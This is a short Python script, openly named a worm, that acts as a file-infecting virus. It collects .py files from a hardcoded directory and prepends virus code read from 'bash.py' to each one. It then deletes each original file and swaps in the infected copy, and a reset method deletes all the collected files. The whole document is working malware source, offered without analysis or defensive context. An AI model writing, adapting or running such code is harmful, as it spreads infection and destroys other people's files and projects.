import os
import random, sys, os

class worm():

    def __init__(self):

        # list of directories
        self.files = []
        self.temp = []
        #
        # list of paths
        self.paths = []

        self.virus = open('bash.py', 'r').readlines()
        for line in self.virus:
            print(line)

        # the initial path that we are searching along
        self.path = '~/Users/Drew/Projects/garbage'

        for root, directories, files in os.walk(self.path):
            self.temp.append(files)

        # if we found at least one file, print it
        if len(self.temp) > 0:
            # we only want the first element
            self.temp = self.temp[0]

        # find every python file that is not a cache file
        for file in self.temp:
            # filters out the cache file
            if '.py' in file and '.pyc' not in file:
                self.files.append('/'.join([self.path,file]))

    # infect all files with python extensions
    def infect(self):

        # infect every python file we found
        for file in self.files:

            # only open the files as read
            with open(file, 'r') as r:

                # construct the name of the infected file
                newName = (str(file) + '.infected')

                # create the new, infected file
                with open(newName, 'a') as w:
                    for line in self.virus:
                        w.write(line)
                    for line in r.readlines():
                        w.write(line)

            # remove the old file
            os.remove(file)

            # rename the infected file to the old file name
            os.rename(newName, file)

    def reset(self):
        for file in self.files:
            os.remove(file)

# make a worm instance
worm = worm()
worm.infect()
